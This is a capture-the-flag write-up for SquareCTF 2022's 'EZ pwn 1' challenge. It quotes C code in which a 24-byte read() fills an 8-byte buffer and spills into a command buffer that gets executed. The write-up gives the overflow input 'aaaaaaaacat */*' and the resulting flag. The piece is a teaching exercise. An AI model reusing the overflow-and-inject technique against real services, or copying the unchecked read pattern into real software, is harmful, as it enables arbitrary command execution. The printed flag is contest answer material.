# EZ pwn 1

**50 points**

Memory safety? Whats that?
Required Reading:
- https://en.wikipedia.org/wiki/Stack_buffer_overflow

`nc chals.2022.squarectf.com 4100`

*Given:* [ez-pwn-1](https://github.com/LeonGurin/SquareCTF-2022/blob/main/EZ%20pwn%201/ez-pwn-1), [source](https://github.com/LeonGurin/SquareCTF-2022/blob/main/EZ%20pwn%201/source)

___

After inspecting the code we notice:

```c
    char command[16];
    char way_too_small_input_buf[8];
    strcpy(command, "ls");

    puts("Hi! would you like me to ls the current directory?");
    read(0, way_too_small_input_buf, 24);
```

the `way_too_small_input_buf` has only 8 bytes while we can read up to 24 inside read.

That means that we can put our custom command inside the command buffer.

Netcatting inside, we firstly enter a valid response less than 8 bytes to see what items in the current directory are, we get:

```
ez-pwn-1  the_flag_is_in_here
```

cool, now we can inject our code.
Because the `the_flag_is_in_here` has too many letters we need to find another way.

My friend found a nice way which is to use recursive `cat` with the following command:

`cat */*`

so netcatting inside and entering:

`aaaaaaaacat */*`

we get the flag:

>flag{congrats_youve_exploited_a_memory_corruption_vulnerability}

